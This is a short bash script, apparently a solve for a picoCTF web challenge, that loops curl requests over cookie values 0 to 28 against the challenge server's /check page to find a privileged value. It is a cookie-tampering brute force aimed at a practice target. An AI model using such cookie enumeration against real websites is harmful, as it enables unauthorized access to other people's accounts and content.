#!/bin/bash

for i in {0..28}
do
	curl --cookie "name=$i" "http://mercury.picoctf.net:6418/check"
done